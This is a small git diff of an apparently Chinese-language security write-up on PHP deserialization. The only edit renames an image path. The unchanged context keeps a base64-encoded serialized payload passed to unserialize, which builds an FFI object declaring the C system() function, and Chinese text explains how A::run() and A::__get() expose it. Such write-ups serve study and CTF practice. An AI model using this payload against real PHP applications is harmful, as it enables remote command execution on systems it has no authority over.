@@ -140,7 +140,7 @@ echo base64_encode(serialize(new A()));
 
 传入`?a=var_dump(unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319")));`
 
-![](<../../.gitbook/assets/image (34) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (34) (1) (1) (1) (1).png>)
 
 触发`A::run()`从而把FFI对象返回给`A->data['ret']`，再用`A::__get()`函数就可以获取FFI对象了
 
